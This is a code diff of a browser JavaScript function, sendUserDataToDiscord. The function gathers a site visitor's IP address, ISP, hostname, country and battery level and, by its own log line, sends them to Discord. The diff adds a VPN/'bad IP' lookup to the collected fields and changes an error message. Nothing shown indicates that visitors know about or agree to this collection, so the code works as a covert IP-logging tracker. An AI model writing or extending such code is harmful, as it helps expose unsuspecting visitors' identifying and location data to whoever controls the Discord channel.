@@ -5,6 +5,10 @@ async function sendUserDataToDiscord() {
     const geoResponse = await fetch('https://json.geoiplookup.io');
     const geoData = await geoResponse.json();
 
+    // Fetch VPN/bad IP data from vpn.geoiplookup.io
+    const vpnResponse = await fetch('https://vpn.geoiplookup.io/');
+    const vpnData = await vpnResponse.json();
+
     // Gather additional user data from the browser
     const battery = navigator.getBattery ? await navigator.getBattery() : null;
     const userData = {
@@ -14,11 +18,12 @@ async function sendUserDataToDiscord() {
       batteryLevel: battery ? battery.level * 100 : 'N/A',
     };
 
-    // Create message content with all the requested fields
+    // Create message content with all the requested fields, including bad IP check
     const messageContent = `
       **User Data:**
       - IP Address: ${geoData.ip}
       - ISP: ${geoData.isp}
+      - Bad IP: ${vpnData.badip}
       - Hostname: ${geoData.hostname}
       - Country: ${geoData.country_name}
       - Country Code: ${geoData.country_code}
@@ -58,7 +63,7 @@ async function sendUserDataToDiscord() {
 
     console.log('User data sent to Discord.');
   } catch (error) {
-    console.error('Could not log visit', error);
+    console.error('errror prob', error);
   }
 }
 
